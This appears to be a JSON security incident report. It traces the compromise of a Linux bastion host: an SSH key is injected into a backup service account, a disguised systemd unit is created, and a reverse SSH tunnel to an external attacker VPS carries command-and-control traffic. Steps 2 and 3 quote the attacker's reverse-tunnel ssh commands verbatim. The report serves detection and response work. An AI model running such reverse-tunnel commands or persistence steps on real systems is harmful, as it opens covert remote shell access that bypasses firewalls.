{
  "severity": "critical",
  "host_observations": [
    {"host": "ubuntu-jump-srv-12", "ip": "10.108.57.188", "role": "internal_linux_bastion_compromised", "first_seen": "2027-02-14T02:48:11+0100", "last_seen": "2027-02-14T02:58:34+0100"},
    {"ip": "10.108.57.188", "inferred_role": "reverse_tunnel_endpoint_internal", "first_seen": "2027-02-14T02:50:33+0100", "last_seen": "2027-02-14T02:58:34+0100"},
    {"ip": "167.99.74.221", "inferred_role": "external_attacker_vps_tunnel_receiver", "first_seen": "2027-02-14T02:50:33+0100", "last_seen": "2027-02-14T02:58:34+0100"}
  ],
  "attack_progression": [
    {"step": 1, "tactic": "Persistence / Account Manipulation — SSH Authorized Keys", "technique": "T1098.004", "what_happened": "At 2027-02-14 02:48:11 CET, Wazuh FIM (syscheck) reported syscheck.event='modified' on syscheck.path=/home/svc_backup/.ssh/authorized_keys on host ubuntu-jump-srv-12 (agent.id=088, agent.ip=10.108.57.188). The file grew by one line: a new RSA pubkey with comment 'corp-backup-key-20270214_024811' was appended. svc_backup is a service account (uid=1001) used legitimately for nightly database-backup rsync over SSH — it is NOT a normal interactive user, and adding new authorized keys to it is OUT-OF-PATTERN (no change-ticket, no admin session preceding the modification). This is identity-level persistence: the attacker now has passwordless SSH-as-svc_backup from any host holding the matching private key.", "chain_reason": "Wazuh FIM rule 550 'authorized_keys modified' fired with rule.mitre.id=T1098.004 on syscheck.path=/home/svc_backup/.ssh/authorized_keys. The file was previously stable for 47 days (last modification by config-management on 2026-12-28) and the modification is unattended (no preceding sudo/su audit event in the prior 5 min from any admin).", "first_seen": "2027-02-14T02:48:11+0100"},
    {"step": 2, "tactic": "Persistence / Create or Modify System Process — Systemd Service", "technique": "T1543.002", "what_happened": "At 02:48:39 CET (28s after step 1), Wazuh FIM reported syscheck.event='added' on syscheck.path=/etc/systemd/system/ssh-tunnel.service. The unit, owner root, masquerades as 'Corp SSH Backup Tunnel' (Description= line) but its ExecStart= line invokes /usr/bin/ssh -N -R 2222:localhost:22 attacker@167.99.74.221 with -i /tmp/p058_20270214_024811/.ssh/id_rsa_tunnel and Restart=always. The unit is NOT dpkg-owned and NOT in the corp-Ansible inventory. WantedBy=multi-user.target means the reverse tunnel will auto-establish on every boot. The deceptive name 'Corp SSH Backup Tunnel' is designed to blend with the legitimate corp-backup service naming.", "chain_reason": "Wazuh FIM rule 550 + custom rule 31103 'New systemd unit referencing ssh -R reverse tunnel' fired with rule.mitre.id=[T1543.002,T1572] on the new unit file. The 28-second gap from step 1 is consistent with a scripted operator chain (key injection then unit drop). The ExecStart string literally contains '-R 2222:localhost:22 attacker@167.99.74.221' — auto-classifying it as protocol tunneling.", "first_seen": "2027-02-14T02:48:39+0100"},
    {"step": 3, "tactic": "Command and Control / Protocol Tunneling — Reverse SSH Tunnel Established", "technique": "T1572", "what_happened": "At 02:50:33 CET (~2min from step 1, after the script's jittered_sleep), Linux auditd captured an EXECVE: data.audit.exe=/usr/bin/ssh, data.audit.command='ssh -o StrictHostKeyChecking=no -o ConnectTimeout=8 -o ServerAliveInterval=30 -i /tmp/p058_20270214_024811/.ssh/id_rsa_tunnel -N -R 2222:127.0.0.1:22 root@167.99.74.221 -f', data.audit.uid=1001 (svc_backup), data.audit.ppid=4719. Within 2 seconds, Suricata logged the outbound TCP three-way handshake: data.srcip=10.108.57.188, data.srcport=44827, data.dstip=167.99.74.221, data.dstport=22, data.alert.signature='ET POLICY Outbound SSH connection to non-corporate IP'. The reverse tunnel is established: any attacker SSH-ing to 167.99.74.221:2222 is now forwarded into 10.108.57.188:22 — inbound shell access through the firewall WITHOUT any inbound firewall rule change required.", "chain_reason": "Wazuh custom rule 5710 'SSH reverse tunnel established to foreign IP' fired with rule.mitre.id=[T1572,T1133] when the auditd EXECVE pattern (ssh + -N + -R + non-RFC1918 destination) matched, AND Suricata rule 'ET POLICY Outbound SSH connection to non-corporate IP' fired on the corresponding flow. The destination IP 167.99.74.221 (DigitalOcean NL) is NOT in the corp-approved-SSH-targets allowlist used by the legitimate svc_backup rsync target (which is 10.108.61.40).", "first_seen": "2027-02-14T02:50:33+0100"},
    {"step": 4, "tactic": "Command and Control / Protocol Tunneling — Sustained Bidirectional Traffic", "technique": "T1572", "what_happened": "From 02:50:35 CET through 02:58:34 CET (≈8 minutes), Suricata logged a SINGLE long-lived TCP flow on data.srcip=10.108.57.188 data.dstip=167.99.74.221 data.dstport=22 with persistent keepalives every ~30 seconds (matching the ServerAliveInterval=30 option from step 3's ssh command). The flow exchanged 47,892 bytes outbound and 71,114 bytes inbound — non-zero inbound bytes prove the channel was USED (not just opened): the attacker pushed commands/data back through the tunnel. This is active C2, not idle persistence.", "chain_reason": "Wazuh custom rule 5501 'Long-lived outbound SSH session to non-corporate IP' fired with rule.mitre.id=T1572 when Suricata flow telemetry showed a single TCP session on dstport=22 lasting >5 minutes with bidirectional bytes >10KB each direction. Same source IP + same destination IP as step 3's ssh -R EXECVE — same session. The inbound bytes are the operationally decisive indicator that distinguishes a probing connection from active tunnel use.", "first_seen": "2027-02-14T02:50:35+0100"}
  ],
  "time_window": {"start": "2027-02-14T02:48:11+0100", "end": "2027-02-14T02:58:34+0100"},
